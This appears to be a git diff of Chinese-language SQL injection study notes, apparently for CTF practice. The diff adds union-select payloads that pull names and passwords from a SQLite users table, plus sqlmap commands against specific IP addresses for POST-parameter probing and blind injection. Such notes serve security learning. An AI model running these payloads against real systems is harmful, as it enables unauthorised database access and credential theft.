@@ -43,6 +43,21 @@ and ascii(substr((select column_name from information_schema.columns where table
 
 
 
+## 手工尝试
+
+```sh
+# 一个 Sqlite 数据库的破解步骤
+# 根据 order by 后面的数字猜测字段的长度
+$ usr=1' order by 3 --+&pw=123
+$ usr=1' union select id,group_concat(id) from users --+&pw=123
+$ usr=1' union select id,group_concat(name) from users --+&pw=123
+$ usr=1' union select id,group_concat(password) from users --+&pw=123
+```
+
+
+
+
+
 
 ## Mysql 预处理
 
@@ -63,7 +78,10 @@ $ sqlmap -u http://223.112.5.156:59050/index.php\?id\=1 -D cyber --tables
 $ sqlmap -u http://223.112.5.156:59050/index.php\?id\=1 -D cyber -T cyber --dump
 
 # 利用 POST 参数进行探测, search 为参数
-$ sqlmap -u http://223.112.5.156:53583/ --data=search=1  --current-db
+$ sqlmap -u http://223.112.5.156:53583/ --data="search=1"  --current-db
+
+# 盲注
+$ sqlmap -u http://1.1.1.1 --technique B
 ```
 
 Sqlmap 的 tamper 脚本提供了一些绕过注入的方法。
